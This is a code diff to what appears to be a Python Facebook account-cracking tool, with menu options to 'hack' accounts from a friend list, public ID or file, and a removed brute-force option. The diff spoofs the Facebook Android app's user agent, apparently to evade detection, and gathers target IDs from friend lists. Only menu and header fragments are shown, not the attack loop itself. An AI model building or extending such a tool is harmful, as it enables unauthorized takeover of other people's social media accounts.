@@ -13,7 +13,7 @@ sys.setdefaultencoding('utf8')
 br = mechanize.Browser()
 br.set_handle_robots(False)
 br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
-br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
+br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
 
 def keluar():
 	print "\033[1;96m[!] \x1b[1;91mExit"
@@ -244,8 +244,7 @@ def super():
 	print logo
 	print "\x1b[1;32;40m[1] \033[1;33;40m══Hack From Friend List"
 	print "\x1b[1;32;40m[2] \033[1;33;40m══Hack From Public ID"
-	print "\x1b[1;32;40m[3] \033[1;33;40m══Hack Bruteforce"
-	print "\x1b[1;32;40m[4] \033[1;33;40m══Hack From File"
+	print "\x1b[1;32;40m[3] \033[1;33;40m══Hack From File"
 	print "\x1b[1;32;40m[0] \033[1;33;40m══Back"
 	pilih_super()
 
@@ -282,10 +281,6 @@ def pilih_super():
 		for i in z['data']:
 			id.append(i['id'])
 	elif peak =="3":
-		os.system('clear')
-		print logo
-		brute()	
-	elif peak =="4":
 		os.system('clear')
 		print logo                  
 		try:
